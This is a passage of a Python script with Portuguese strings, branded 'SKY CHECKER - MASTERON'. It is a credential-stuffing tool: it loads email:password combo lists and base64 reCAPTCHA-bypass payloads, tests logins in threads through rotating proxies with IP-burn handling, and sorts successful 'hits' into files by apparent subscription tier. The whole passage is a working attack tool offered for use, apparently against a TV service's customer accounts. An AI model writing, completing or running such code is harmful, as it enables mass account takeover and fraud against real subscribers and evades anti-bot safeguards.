# FUNÇÃO DE PROCESSAMENTO COM FILA DE TRABALHO DINÂMICA
# ============================================================

def worker(work_queue: queue.Queue, proxy_template: Optional[str], original_payload: str, results: List, original_web_payload: Optional[str] = None):
    checker = SkyLiteChecker(
        base_proxy_template=proxy_template,
        max_ip_burns=15,
        max_retries_per_ip=2,
    )

    while True:
        try:
            item = work_queue.get_nowait()
        except queue.Empty:
            break

        email, password = item
        try:
            success, result = checker.check(email, password, original_payload, original_web_payload)
            print_result(result, success)

            if success:
                results.append(result)
        except Exception as e:
            print(f"{Fore.RED}❌ {email} - Erro crítico: {e}{Style.RESET_ALL}")
        finally:
            work_queue.task_done()

    checker.close()

# ============================================================
# MAIN
# ============================================================

def main():
    os.system("cls" if os.name == "nt" else "clear")

    print(f"{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}║        SKY CHECKER - MASTERON          ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}║   (reCAPTCHA Bypass - cloudscraper)    ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}╚════════════════════════════════════════╝{Style.RESET_ALL}")
    print()

    if not os.path.exists("payload.b64"):
        print(f"{Fore.RED}❌ Arquivo 'payload.b64' não encontrado. Necessário para o bypass.{Style.RESET_ALL}")
        return

    with open("payload.b64", "r") as f:
        original_payload = f.read().strip()

    original_web_payload = None
    if os.path.exists("payload_web.b64"):
        try:
            with open("payload_web.b64", "r", encoding="utf-8") as f:
                original_web_payload = f.read().strip()
            print(f"{Fore.GREEN}[+] Bypass Web carregado com sucesso (payload_web.b64){Style.RESET_ALL}")
        except Exception:
            pass

    print(f"{Fore.GREEN}[1]{Style.RESET_ALL} Arquivo Único")
    print(f"{Fore.GREEN}[2]{Style.RESET_ALL} Combo (pasta combo/)")
    print(f"{Fore.GREEN}[3]{Style.RESET_ALL} Sair")
    print()

    option = input(f"{Fore.CYAN}>> {Style.RESET_ALL}").strip()

    logins = []

    if option == "1":
        filepath = input(f"{Fore.CYAN}Arquivo: {Style.RESET_ALL}").strip()
        if os.path.exists(filepath):
            logins = load_logins_from_file(filepath)
        else:
            print(f"{Fore.RED}Arquivo não encontrado!{Style.RESET_ALL}")
            return

    elif option == "2":
        logins = load_logins_from_combo_folder()

    else:
        return

    if not logins:
        print(f"{Fore.RED}Nenhum login carregado!{Style.RESET_ALL}")
        return

    print(f"\n{Fore.CYAN}Logins carregados: {len(logins)}{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}[1]{Style.RESET_ALL} Direto (sem proxy)")
    print(f"{Fore.GREEN}[2]{Style.RESET_ALL} Proxy Data Impulse (rotativo)")
    print()

    proxy_mode = input(f"{Fore.CYAN}Modo: {Style.RESET_ALL}").strip()

    proxy_template = None
    if proxy_mode == "2":
        proxy_template = DEFAULT_PROXY

    threads_input = input(f"\n{Fore.CYAN}Threads (recomendado 3 a 5): {Style.RESET_ALL}").strip()
    threads = int(threads_input) if threads_input else 3

    work_queue = queue.Queue()
    for item in logins:
        work_queue.put(item)

    num_workers = min(threads, len(logins))
    results = []

    print(f"\n{Fore.GREEN}{Style.BRIGHT}╔════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{Style.BRIGHT}║          INICIANDO VERIFICAÇÃO         ║{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{Style.BRIGHT}╚════════════════════════════════════════╝{Style.RESET_ALL}")
    print()

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = [
            executor.submit(worker, work_queue, proxy_template, original_payload, results, original_web_payload)
            for _ in range(num_workers)
        ]
        for future in futures:
            future.result()

    elapsed = time.time() - start_time

    print(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}║              RESUMO FINAL              ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}╚════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}✓ Total testados:{Style.RESET_ALL} {len(logins)}")
    print(f"  {Fore.GREEN}✓ Hits:{Style.RESET_ALL} {len(results)}")
    print(f"  {Fore.GREEN}✓ Tempo total:{Style.RESET_ALL} {elapsed:.2f}s")

    if results:
        print(f"\n{Fore.GREEN}Hits salvos na pasta 'hits/' (COMPLETAS.txt, MEDIA.txt, BASICA.txt, PRE_PAGO.txt e Todos_Hits.txt){Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️ Interrompido pelo usuário{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Erro: {e}{Style.RESET_ALL}")
